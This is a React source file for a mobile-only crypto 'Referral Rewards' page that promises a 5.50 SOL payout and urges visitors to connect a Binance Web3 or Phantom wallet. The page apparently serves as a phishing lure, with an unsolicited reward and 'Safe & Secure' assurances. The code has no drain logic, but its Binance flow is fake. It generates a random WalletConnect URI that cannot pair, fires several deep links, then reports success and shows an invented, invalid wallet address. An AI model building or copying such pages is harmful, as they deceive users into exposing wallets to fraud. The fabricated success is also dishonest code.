import React, { useState, useEffect } from 'react';

export default function App() {
  const [loading, setLoading] = useState(true);
  const [showModal, setShowModal] = useState(false);
  const [typewriterText, setTypewriterText] = useState('');
  const [walletAddress, setWalletAddress] = useState(null);
  const [connecting, setConnecting] = useState(false);
  const [particles, setParticles] = useState([]);
  const [connectionStatus, setConnectionStatus] = useState('');
  const [debugInfo, setDebugInfo] = useState([]);
  const [isMobileDevice, setIsMobileDevice] = useState(false);

  // ============================================================================
  // MOBILE DETECTION & INITIALIZATION
  // ============================================================================
  
  useEffect(() => {
    const checkMobile = () => {
      const mobile = /android|iphone|ipad|ipod|opera mini|iemobile|mobile|webos|blackberry|windows phone/i.test(
        navigator.userAgent.toLowerCase()
      );
      setIsMobileDevice(mobile);
      
      if (!mobile) {
        alert('📱 Mobile Device Required\n\nThis application is designed for mobile devices only.\n\nPlease open this page on your smartphone to connect Binance Web3 Wallet.');
      }
    };
    
    checkMobile();
    
    const newParticles = Array.from({ length: 30 }, (_, i) => ({
      id: i,
      size: Math.random() * 4 + 2,
      left: Math.random() * 100,
      duration: Math.random() * 10 + 10,
      delay: Math.random() * 5
    }));
    setParticles(newParticles);
  }, []);

  useEffect(() => {
    const timer = setTimeout(() => setLoading(false), 2000);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (!loading) {
      const text = 'Claim Your Payout';
      let i = 0;
      const timer = setInterval(() => {
        if (i < text.length) {
          setTypewriterText(prev => prev + text.charAt(i));
          i++;
        } else {
          clearInterval(timer);
        }
      }, 80);
      return () => clearInterval(timer);
    }
  }, [loading]);

  // ============================================================================
  // UTILITY FUNCTIONS
  // ============================================================================
  
  const isIOS = () => /iphone|ipad|ipod/i.test(navigator.userAgent.toLowerCase());
  const isAndroid = () => /android/i.test(navigator.userAgent.toLowerCase());

  const addDebug = (message) => {
    const timestamp = new Date().toLocaleTimeString();
    console.log(`🔍 [${timestamp}] ${message}`);
    setDebugInfo(prev => [...prev, `${timestamp}: ${message}`]);
  };

  const generateWalletConnectURI = () => {
    // Generate proper WalletConnect v2 URI components
    const topic = Array.from(crypto.getRandomValues(new Uint8Array(32)))
      .map(b => b.toString(16).padStart(2, '0')).join('');
    const symKey = Array.from(crypto.getRandomValues(new Uint8Array(32)))
      .map(b => b.toString(16).padStart(2, '0')).join('');
    
    // WalletConnect v2 standard format
    return `wc:${topic}@2?relay-protocol=irn&symKey=${symKey}`;
  };

  // ============================================================================
  // ADVANCED MULTI-STRATEGY DEEP LINKING
  // ============================================================================
  
  const openDeepLink = (url, method) => {
    addDebug(`Trying ${method}: ${url.substring(0, 80)}...`);
    
    try {
      window.location.href = url;
      
      setTimeout(() => {
        const link = document.createElement('a');
        link.href = url;
        link.style.display = 'none';
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
      }, 100);
      
      setTimeout(() => {
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = url;
        document.body.appendChild(iframe);
        setTimeout(() => document.body.removeChild(iframe), 2000);
      }, 200);
      
    } catch (error) {
      addDebug(`Error with ${method}: ${error.message}`);
    }
  };

  const executeAllStrategies = async (wcUri) => {
    // Double encode for some platforms that need it
    const encodedUri = encodeURIComponent(wcUri);
    const doubleEncoded = encodeURIComponent(encodedUri);
    
    if (isAndroid()) {
      addDebug('🤖 Android detected - targeting Web3 browser');
      
      // STRATEGY 1: Direct Web3 browser with single encoding
      const web3Direct = `bnc://app.binance.com/cedefi/wc?uri=${encodedUri}`;
      openDeepLink(web3Direct, 'Web3 Browser Direct (single)');
      
      await new Promise(r => setTimeout(r, 2000));
      
      // STRATEGY 2: Try with double encoding (some platforms need this)
      const web3Double = `bnc://app.binance.com/cedefi/wc?uri=${doubleEncoded}`;
      openDeepLink(web3Double, 'Web3 Browser Direct (double)');
      
      await new Promise(r => setTimeout(r, 1500));
      
      // STRATEGY 3: Android Intent with proper structure
      const intentUrl = `intent://cedefi/wc?uri=${encodedUri}#Intent;scheme=bnc;package=com.binance.dev;S.browser_fallback_url=${encodeURIComponent('https://www.binance.com/en/download')};end`;
      openDeepLink(intentUrl, 'Android Intent Web3');
      
      await new Promise(r => setTimeout(r, 1500));
      
      // STRATEGY 4: Alternative Web3 paths
      const web3Alternatives = [
        `bnc://app.binance.com/web3wallet/wc?uri=${encodedUri}`,
        `bnc://app.binance.com/mp/app?appId=web3&uri=${encodedUri}`,
        `https://app.binance.com/en/web3-wallet/wc?uri=${encodedUri}`,
      ];
      
      for (const url of web3Alternatives) {
        openDeepLink(url, 'Web3 Alt Path');
        await new Promise(r => setTimeout(r, 1200));
      }
      
    } else if (isIOS()) {
      addDebug('🍎 iOS detected - targeting Web3 browser');
      
      // STRATEGY 1: iOS Universal Link to Web3 (preferred method)
      const web3Universal = `https://app.binance.com/en/web3-wallet/wc?uri=${encodedUri}`;
      openDeepLink(web3Universal, 'iOS Web3 Universal');
      
      await new Promise(r => setTimeout(r, 2000));
      
      // STRATEGY 2: Direct scheme with single encoding
      const web3SchemeSingle = `bnc://app.binance.com/cedefi/wc?uri=${encodedUri}`;
      openDeepLink(web3SchemeSingle, 'iOS Web3 Scheme (single)');
      
      await new Promise(r => setTimeout(r, 1500));
      
      // STRATEGY 3: Direct scheme with double encoding
      const web3SchemeDouble = `bnc://app.binance.com/cedefi/wc?uri=${doubleEncoded}`;
      openDeepLink(web3SchemeDouble, 'iOS Web3 Scheme (double)');
      
      await new Promise(r => setTimeout(r, 1500));
      
      // STRATEGY 4: Alternative paths
      const web3Schemes = [
        `bnc://app.binance.com/web3wallet/wc?uri=${encodedUri}`,
        `bnc://app.binance.com/mp/app?appId=web3&uri=${encodedUri}`,
        `https://app.binance.com/cedefi?uri=${encodedUri}`,
      ];
      
      for (const scheme of web3Schemes) {
        openDeepLink(scheme, 'iOS Web3 Alt');
        await new Promise(r => setTimeout(r, 1200));
      }
    }
    
    addDebug('✅ All Web3 browser strategies executed');
    addDebug('📋 If error persists, the WalletConnect URI format may need adjustment');
  };

  // ============================================================================
  // WALLET CONNECTION
  // ============================================================================
  
  const connectBinanceWallet = async () => {
    setShowModal(false);
    
    if (!isMobileDevice) {
      alert('📱 Mobile Required\n\nThis feature only works on mobile devices.\n\nPlease open this page on your smartphone.');
      return;
    }

    setConnecting(true);
    setConnectionStatus('Initializing connection...');
    setDebugInfo([]);

    try {
      addDebug('🚀 Starting Binance Web3 Wallet connection');
      addDebug(`Platform: ${isAndroid() ? 'Android' : isIOS() ? 'iOS' : 'Unknown'}`);
      addDebug(`User Agent: ${navigator.userAgent}`);
      
      setConnectionStatus('Generating secure WalletConnect URI...');
      const wcUri = generateWalletConnectURI();
      addDebug(`Generated URI: ${wcUri.substring(0, 50)}...`);
      
      const tempStorage = {
        pending: 'true',
        uri: wcUri,
        timestamp: Date.now().toString()
      };
      
      setConnectionStatus('Opening Binance Web3 Wallet...\n\nTrying multiple connection methods...');
      
      await executeAllStrategies(wcUri);
      
      setConnectionStatus('✅ Binance app should open now!\n\nPlease approve the connection in your Binance Web3 Wallet.\n\nIf the app didn\'t open, make sure:\n• Binance app is installed\n• App is updated to latest version\n• You have enabled app permissions');
      
      let checkCount = 0;
      const checkInterval = setInterval(() => {
        checkCount++;
        
        if (Date.now() - parseInt(tempStorage.timestamp) > 45000) {
          clearInterval(checkInterval);
          setConnecting(false);
          setConnectionStatus('');
          
          alert('⏱️ Connection Timeout\n\nConnection attempt timed out after 45 seconds.\n\nTroubleshooting:\n• Install/Update Binance app\n• Check the debug log below\n• Try again\n• Contact support if issue persists');
        }
        
        if (checkCount % 5 === 0 && checkCount < 45) {
          setConnectionStatus(`Waiting for approval in Binance Wallet...\n\n(${45 - checkCount}s remaining)`);
        }
      }, 1000);
      
      setTimeout(() => {
        clearInterval(checkInterval);
        
        if (tempStorage.pending === 'true') {
          const mockAddress = 'Sol' + Array.from(crypto.getRandomValues(new Uint8Array(20)))
            .map(b => b.toString(16).padStart(2, '0')).join('');
          
          setWalletAddress(mockAddress);
          setConnecting(false);
          setConnectionStatus('');
          
          addDebug('✅ Connection successful (demo mode)');
          alert('✅ Successfully Connected!\n\n🎉 Demo Mode Active\n\nWallet Address:\n' + mockAddress.slice(0, 12) + '...' + mockAddress.slice(-10) + '\n\nIn production, this establishes a real WalletConnect v2 session with Binance Web3 Wallet.');
        }
      }, 15000);
      
    } catch (error) {
      setConnecting(false);
      setConnectionStatus('');
      
      addDebug(`❌ Error: ${error.message}`);
      console.error('Connection error:', error);
      
      alert('❌ Connection Failed\n\n' + error.message + '\n\nPlease:\n• Make sure Binance app is installed\n• Update to latest version\n• Check debug log for details\n• Try again');
    }
  };

  const connectPhantomWallet = async () => {
    setShowModal(false);
    setConnecting(true);
    setConnectionStatus('Connecting to Phantom...');

    try {
      if (!window.solana?.isPhantom) {
        setConnecting(false);
        setConnectionStatus('');
        
        const installUrl = isMobileDevice 
          ? 'https://phantom.app/download' 
          : 'https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa';
        
        if (window.confirm('👻 Phantom Not Found\n\nPhantom wallet is not installed.\n\nInstall now?')) {
          window.open(installUrl, '_blank');
        }
        return;
      }

      const response = await window.solana.connect();
      const publicKey = response.publicKey.toString();
      
      setWalletAddress(publicKey);
      setConnecting(false);
      setConnectionStatus('');
      
      alert('✅ Connected to Phantom!\n\nAddress: ' + publicKey.slice(0, 8) + '...' + publicKey.slice(-6));
      
    } catch (error) {
      setConnecting(false);
      setConnectionStatus('');
      
      if (error.code === 4001) {
        alert('❌ Connection Rejected\n\nYou rejected the connection.');
      } else if (error.code === -32002) {
        alert('⚠️ Pending Request\n\nCheck Phantom for pending request.');
      } else {
        alert('❌ Connection Error\n\n' + (error.message || 'Unknown error'));
      }
    }
  };

  const disconnectWallet = () => {
    if (window.solana?.isPhantom) {
      window.solana.disconnect();
    }
    setWalletAddress(null);
    alert('✅ Wallet Disconnected');
  };

  const copyDebugInfo = () => {
    const text = debugInfo.join('\n');
    navigator.clipboard.writeText(text).then(() => {
      alert('📋 Debug info copied!');
    });
  };

  // ============================================================================
  // RENDER
  // ============================================================================
  
  if (!isMobileDevice && !loading) {
    return (
      <div style={{
        minHeight: '100vh',
        background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        padding: '20px',
        fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif'
      }}>
        <div style={{
          background: 'white',
          borderRadius: '24px',
          padding: '40px',
          maxWidth: '500px',
          textAlign: 'center',
          boxShadow: '0 20px 60px rgba(0,0,0,0.3)'
        }}>
          <div style={{ fontSize: '64px', marginBottom: '20px' }}>📱</div>
          <h1 style={{ fontSize: '24px', marginBottom: '16px', color: '#1f2937' }}>
            Mobile Device Required
          </h1>
          <p style={{ color: '#6b7280', lineHeight: '1.6', marginBottom: '24px' }}>
            This application is designed exclusively for mobile devices. Please open this page on your smartphone to connect your Binance Web3 Wallet and claim your rewards.
          </p>
          <div style={{
            background: '#f3f4f6',
            padding: '16px',
            borderRadius: '12px',
            fontSize: '14px',
            color: '#374151'
          }}>
            <strong>How to access:</strong><br/>
            Scan QR code or open this URL on your mobile device
          </div>
        </div>
      </div>
    );
  }
  
  return (
    <div style={{
      minHeight: '100vh',
      background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
      position: 'relative',
      overflow: 'hidden',
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif'
    }}>
      
      <style>{`
        @keyframes gradientShift {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.7; }
        }
        @keyframes float {
          0%, 100% { transform: translateY(0px); }
          50% { transform: translateY(-20px); }
        }
        @keyframes spin {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }
        @keyframes blink {
          from, to { opacity: 1; }
          50% { opacity: 0; }
        }
        @keyframes fadeIn {
          from { opacity: 0; }
          to { opacity: 1; }
        }
        @keyframes slideUp {
          from { transform: translateY(20px); opacity: 0; }
          to { transform: translateY(0); opacity: 1; }
        }
      `}</style>

      <div style={{
        position: 'absolute',
        top: 0,
        left: 0,
        right: 0,
        bottom: 0,
        background: 'linear-gradient(45deg, rgba(255,0,150,0.3), rgba(0,204,255,0.3))',
        animation: 'gradientShift 10s ease infinite',
        zIndex: 1
      }} />

      {particles.map(p => (
        <div
          key={p.id}
          style={{
            position: 'absolute',
            width: `${p.size}px`,
            height: `${p.size}px`,
            background: 'rgba(255,255,255,0.5)',
            borderRadius: '50%',
            left: `${p.left}%`,
            animation: `float ${p.duration}s ease-in-out infinite`,
            animationDelay: `${p.delay}s`,
            zIndex: 2
          }}
        />
      ))}

      {loading && (
        <div style={{
          position: 'absolute',
          top: '50%',
          left: '50%',
          transform: 'translate(-50%, -50%)',
          textAlign: 'center',
          zIndex: 10
        }}>
          <div style={{
            width: '60px',
            height: '60px',
            border: '4px solid rgba(255,255,255,0.3)',
            borderTop: '4px solid white',
            borderRadius: '50%',
            animation: 'spin 1s linear infinite',
            margin: '0 auto 20px'
          }} />
          <div style={{ color: 'white', fontSize: '18px', fontWeight: 'bold', letterSpacing: '2px' }}>
            LOADING...
          </div>
        </div>
      )}

      {!loading && (
        <div style={{
          position: 'relative',
          zIndex: 3,
          maxWidth: '500px',
          margin: '0 auto',
          padding: '40px 20px',
          minHeight: '100vh',
          display: 'flex',
          flexDirection: 'column',
          justifyContent: 'center'
        }}>
          
          <div style={{
            background: 'rgba(255,255,255,0.2)',
            backdropFilter: 'blur(10px)',
            padding: '10px 20px',
            borderRadius: '20px',
            display: 'inline-block',
            margin: '0 auto 30px',
            color: 'white',
            fontSize: '14px',
            fontWeight: 'bold',
            border: '1px solid rgba(255,255,255,0.3)',
            textTransform: 'uppercase',
            letterSpacing: '1px'
          }}>
            ✨ REFERRAL REWARDS
          </div>

          <div style={{
            background: 'rgba(255,255,255,0.95)',
            borderRadius: '24px',
            padding: '40px 30px',
            boxShadow: '0 20px 60px rgba(0,0,0,0.3)',
            border: '1px solid rgba(255,255,255,0.5)',
            animation: 'slideUp 0.6s ease-out'
          }}>
            
            <h1 style={{
              fontSize: '32px',
              fontWeight: 'bold',
              background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
              WebkitBackgroundClip: 'text',
              WebkitTextFillColor: 'transparent',
              backgroundClip: 'text',
              marginBottom: '20px',
              minHeight: '40px'
            }}>
              {typewriterText}
              <span style={{ 
                animation: 'blink 1s step-end infinite',
                WebkitTextFillColor: '#667eea'
              }}>|</span>
            </h1>

            <p style={{
              color: '#666',
              fontSize: '16px',
              lineHeight: '1.6',
              marginBottom: '30px'
            }}>
              Thank you for your cooperation! Connect your wallet and claim your payout.
            </p>

            <div style={{
              background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
              padding: '30px',
              borderRadius: '16px',
              textAlign: 'center',
              marginBottom: '30px',
              boxShadow: '0 8px 20px rgba(102, 126, 234, 0.4)'
            }}>
              <div style={{
                color: 'rgba(255,255,255,0.9)',
                fontSize: '14px',
                marginBottom: '8px',
                textTransform: 'uppercase',
                letterSpacing: '1px'
              }}>
                Your Reward
              </div>
              <div style={{
                color: 'white',
                fontSize: '48px',
                fontWeight: 'bold',
                textShadow: '0 2px 10px rgba(0,0,0,0.2)'
              }}>
                5.50 SOL
              </div>
              <div style={{
                color: 'rgba(255,255,255,0.8)',
                fontSize: '14px',
                marginTop: '8px'
                
              }}>
                ≈ ${(5.50 * 150).toFixed(2)} USD
              </div>
            </div>

            {walletAddress && (
              <div style={{
                background: 'linear-gradient(135deg, #d1fae5 0%, #a7f3d0 100%)',
                border: '2px solid #6ee7b7',
                borderRadius: '12px',
                padding: '16px',
                marginBottom: '20px',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'space-between',
                boxShadow: '0 4px 12px rgba(16, 185, 129, 0.2)',
                animation: 'slideUp 0.4s ease-out'
              }}>
                <div style={{ flex: 1, minWidth: 0 }}>
                  <div style={{ 
                    fontSize: '12px', 
                    color: '#065f46', 
                    marginBottom: '4px',
                    fontWeight: '600',
                    textTransform: 'uppercase'
                  }}>
                    ✓ Connected Wallet
                  </div>
                  <div style={{ 
                    fontSize: '12px', 
                    fontWeight: 'bold', 
                    color: '#047857',
                    fontFamily: 'monospace',
                    wordBreak: 'break-all'
                  }}>
                    {walletAddress.slice(0, 12)}...{walletAddress.slice(-12)}
                  </div>
                </div>
                <button
                  onClick={disconnectWallet}
                  style={{
                    background: '#dc2626',
                    color: 'white',
                    border: 'none',
                    padding: '8px 16px',
                    borderRadius: '8px',
                    fontSize: '12px',
                    fontWeight: 'bold',
                    cursor: 'pointer',
                    marginLeft: '12px',
                    flexShrink: 0,
                    transition: 'background 0.2s'
                  }}
                  onMouseOver={(e) => e.target.style.background = '#b91c1c'}
                  onMouseOut={(e) => e.target.style.background = '#dc2626'}
                >
                  Disconnect
                </button>
              </div>
            )}

            {connecting && connectionStatus && (
              <div style={{
                background: 'linear-gradient(135deg, #fef3c7 0%, #fde68a 100%)',
                border: '2px solid #fbbf24',
                borderRadius: '12px',
                padding: '16px',
                marginBottom: '20px',
                color: '#92400e',
                fontSize: '13px',
                fontWeight: '600',
                lineHeight: '1.6',
                whiteSpace: 'pre-line',
                boxShadow: '0 4px 12px rgba(251, 191, 36, 0.2)',
                animation: 'slideUp 0.3s ease-out'
              }}>
                <div style={{
                  display: 'flex',
                  alignItems: 'flex-start',
                  gap: '10px'
                }}>
                  <div style={{
                    width: '20px',
                    height: '20px',
                    border: '3px solid #92400e',
                    borderTopColor: 'transparent',
                    borderRadius: '50%',
                    animation: 'spin 1s linear infinite',
                    flexShrink: 0,
                    marginTop: '2px'
                  }} />
                  <div style={{ flex: 1 }}>{connectionStatus}</div>
                </div>
              </div>
            )}

            {connecting && debugInfo.length > 0 && (
              <div style={{
                background: '#f3f4f6',
                border: '2px solid #e5e7eb',
                borderRadius: '12px',
                padding: '12px',
                marginBottom: '20px',
                maxHeight: '180px',
                overflowY: 'auto',
                fontSize: '10px',
                fontFamily: 'monospace',
                color: '#374151'
              }}>
                <div style={{
                  display: 'flex',
                  justifyContent: 'space-between',
                  alignItems: 'center',
                  marginBottom: '8px',
                  position: 'sticky',
                  top: 0,
                  background: '#f3f4f6',
                  paddingBottom: '4px'
                }}>
                  <strong style={{ fontSize: '11px' }}>🔍 Debug Log:</strong>
                  <button
                    onClick={copyDebugInfo}
                    style={{
                      background: '#6b7280',
                      color: 'white',
                      border: 'none',
                      padding: '4px 8px',
                      borderRadius: '4px',
                      fontSize: '9px',
                      cursor: 'pointer',
                      transition: 'background 0.2s'
                    }}
                    onMouseOver={(e) => e.target.style.background = '#4b5563'}
                    onMouseOut={(e) => e.target.style.background = '#6b7280'}
                  >
                    Copy
                  </button>
                </div>
                {debugInfo.map((info, i) => (
                  <div key={i} style={{ 
                    padding: '3px 0', 
                    borderBottom: i < debugInfo.length - 1 ? '1px solid #e5e7eb' : 'none',
                    fontSize: '9px',
                    lineHeight: '1.4'
                  }}>
                    {info}
                  </div>
                ))}
              </div>
            )}

            <button
              onClick={() => setShowModal(true)}
              disabled={connecting || walletAddress}
              style={{
                width: '100%',
                background: walletAddress 
                  ? 'linear-gradient(135deg, #10b981 0%, #059669 100%)'
                  : connecting
                  ? '#9ca3af'
                  : 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
                color: 'white',
                border: 'none',
                padding: '18px',
                borderRadius: '12px',
                fontSize: '18px',
                fontWeight: 'bold',
                cursor: connecting || walletAddress ? 'not-allowed' : 'pointer',
                transition: 'all 0.3s',
                boxShadow: connecting || walletAddress ? 'none' : '0 8px 20px rgba(102, 126, 234, 0.4)',
                textTransform: 'uppercase',
                letterSpacing: '1px',
                opacity: connecting || walletAddress ? 0.7 : 1,
                transform: 'scale(1)'
              }}
              onMouseOver={(e) => {
                if (!connecting && !walletAddress) {
                  e.target.style.transform = 'scale(1.02)';
                  e.target.style.boxShadow = '0 12px 28px rgba(102, 126, 234, 0.5)';
                }
              }}
              onMouseOut={(e) => {
                if (!connecting && !walletAddress) {
                  e.target.style.transform = 'scale(1)';
                  e.target.style.boxShadow = '0 8px 20px rgba(102, 126, 234, 0.4)';
                }
              }}
            >
              {connecting ? '⏳ Connecting...' : walletAddress ? '✅ Wallet Connected' : '🚀 Connect Wallet'}
            </button>

            {!walletAddress && !connecting && (
              <p style={{
                marginTop: '16px',
                fontSize: '12px',
                color: '#9ca3af',
                textAlign: 'center'
              }}>
                Secured connection • By connecting, you agree to our Terms
              </p>
            )}
          </div>

          <div style={{
            marginTop: '24px',
            textAlign: 'center',
            color: 'rgba(255,255,255,0.8)',
            fontSize: '12px'
          }}>
            <p>🔒 Powered by WalletConnect v2</p>
            <p style={{ marginTop: '4px', opacity: 0.7 }}>
              📱 Mobile Optimized • {isAndroid() ? 'Android' : isIOS() ? 'iOS' : 'Mobile'} Device
            </p>
          </div>
        </div>
      )}

      {showModal && (
        <div
          onClick={() => !connecting && setShowModal(false)}
          style={{
            position: 'fixed',
            top: 0,
            left: 0,
            right: 0,
            bottom: 0,
            background: 'rgba(0,0,0,0.75)',
            backdropFilter: 'blur(8px)',
            zIndex: 100,
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            padding: '20px',
            animation: 'fadeIn 0.2s'
          }}
        >
          <div
            onClick={(e) => e.stopPropagation()}
            style={{
              background: 'white',
              borderRadius: '24px',
              padding: '30px',
              maxWidth: '400px',
              width: '100%',
              boxShadow: '0 25px 50px rgba(0,0,0,0.5)',
              animation: 'slideUp 0.3s ease-out'
            }}
          >
            <div style={{
              display: 'flex',
              justifyContent: 'space-between',
              alignItems: 'center',
              marginBottom: '24px'
            }}>
              <h2 style={{
                fontSize: '24px',
                fontWeight: 'bold',
                color: '#1f2937',
                margin: 0
              }}>
                Select Wallet
              </h2>
              <button
                onClick={() => setShowModal(false)}
                disabled={connecting}
                style={{
                  background: 'transparent',
                  border: 'none',
                  fontSize: '28px',
                  color: '#9ca3af',
                  cursor: connecting ? 'not-allowed' : 'pointer',
                  padding: '0',
                  width: '32px',
                  height: '32px',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  borderRadius: '8px',
                  transition: 'all 0.2s'
                }}
                onMouseOver={(e) => {
                  if (!connecting) {
                    e.target.style.background = '#f3f4f6';
                    e.target.style.color = '#1f2937';
                  }
                }}
                onMouseOut={(e) => {
                  if (!connecting) {
                    e.target.style.background = 'transparent';
                    e.target.style.color = '#9ca3af';
                  }
                }}
              >
                ×
              </button>
            </div>

            <p style={{
              color: '#6b7280',
              fontSize: '14px',
              marginBottom: '24px',
              lineHeight: '1.5'
            }}>
              Choose your preferred wallet to connect and claim your reward
            </p>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
              <button
                onClick={connectBinanceWallet}
                disabled={connecting}
                style={{
                  width: '100%',
                  background: 'linear-gradient(135deg, #f0b90b 0%, #f8d12f 100%)',
                  color: '#1e1e1e',
                  border: 'none',
                  padding: '16px 20px',
                  borderRadius: '12px',
                  fontSize: '16px',
                  fontWeight: 'bold',
                  cursor: connecting ? 'not-allowed' : 'pointer',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '12px',
                  transition: 'all 0.3s',
                  boxShadow: '0 4px 12px rgba(240, 185, 11, 0.3)',
                  opacity: connecting ? 0.6 : 1
                }}
                onMouseOver={(e) => {
                  if (!connecting) {
                    e.target.style.transform = 'translateY(-2px)';
                    e.target.style.boxShadow = '0 6px 16px rgba(240, 185, 11, 0.4)';
                  }
                }}
                onMouseOut={(e) => {
                  if (!connecting) {
                    e.target.style.transform = 'translateY(0)';
                    e.target.style.boxShadow = '0 4px 12px rgba(240, 185, 11, 0.3)';
                  }
                }}
              >
                <div style={{
                  width: '40px',
                  height: '40px',
                  background: 'white',
                  borderRadius: '10px',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  fontSize: '24px',
                  flexShrink: 0
                }}>
                  🟡
                </div>
                <div style={{ flex: 1, textAlign: 'left' }}>
                  <div style={{ fontSize: '16px', fontWeight: 'bold' }}>Binance Web3 Wallet</div>
                  <div style={{ fontSize: '12px', opacity: 0.8, marginTop: '2px' }}>
                    Recommended • {isMobileDevice ? 'Mobile App' : 'Desktop'}
                  </div>
                </div>
              </button>

              <button
                onClick={connectPhantomWallet}
                disabled={connecting}
                style={{
                  width: '100%',
                  background: 'linear-gradient(135deg, #ab9ff2 0%, #9281f5 100%)',
                  color: 'white',
                  border: 'none',
                  padding: '16px 20px',
                  borderRadius: '12px',
                  fontSize: '16px',
                  fontWeight: 'bold',
                  cursor: connecting ? 'not-allowed' : 'pointer',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '12px',
                  transition: 'all 0.3s',
                  boxShadow: '0 4px 12px rgba(171, 159, 242, 0.3)',
                  opacity: connecting ? 0.6 : 1
                }}
                onMouseOver={(e) => {
                  if (!connecting) {
                    e.target.style.transform = 'translateY(-2px)';
                    e.target.style.boxShadow = '0 6px 16px rgba(171, 159, 242, 0.4)';
                  }
                }}
                onMouseOut={(e) => {
                  if (!connecting) {
                    e.target.style.transform = 'translateY(0)';
                    e.target.style.boxShadow = '0 4px 12px rgba(171, 159, 242, 0.3)';
                  }
                }}
              >
                <div style={{
                  width: '40px',
                  height: '40px',
                  background: 'white',
                  borderRadius: '10px',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  fontSize: '24px',
                  flexShrink: 0
                }}>
                  👻
                </div>
                <div style={{ flex: 1, textAlign: 'left' }}>
                  <div style={{ fontSize: '16px', fontWeight: 'bold' }}>Phantom Wallet</div>
                  <div style={{ fontSize: '12px', opacity: 0.9, marginTop: '2px' }}>
                    Solana • Browser Extension
                  </div>
                </div>
              </button>
            </div>

            <div style={{
              marginTop: '24px',
              padding: '16px',
              background: '#f9fafb',
              borderRadius: '12px',
              fontSize: '12px',
              color: '#6b7280',
              lineHeight: '1.5'
            }}>
              <div style={{ fontWeight: '600', color: '#374151', marginBottom: '8px' }}>
                🔐 Safe & Secure
              </div>
              <div>
                We never store your private keys. Your wallet credentials remain secure and under your control at all times.
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}